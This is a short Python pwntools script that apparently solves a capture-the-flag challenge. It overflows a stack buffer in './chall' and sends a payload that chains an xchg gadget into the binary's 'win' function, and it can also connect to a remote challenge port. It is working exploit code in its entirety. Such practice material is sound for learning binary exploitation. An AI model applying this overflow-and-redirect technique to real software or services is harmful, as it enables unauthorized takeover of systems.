#!usr/bin/python3
from pwn import *

exe = './chall'
elf = context.binary = ELF(exe, checksec=True)
context.log_level = 'debug'
host, port = '', 1337

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)
    
gdbscript = '''
init-pwndbg
'''.format(**locals())
    
def exploit():
    global io
    io = initialize()

    xchg = 0x4011cb
    
    offset = 40 - 8
    payload = flat({
        offset: [
            0x1945,
            xchg,
            elf.sym['win']
        ]
    })
    io.sendlineafter(b'>>', payload)

    io.interactive()
    
if __name__ == '__main__':
    exploit()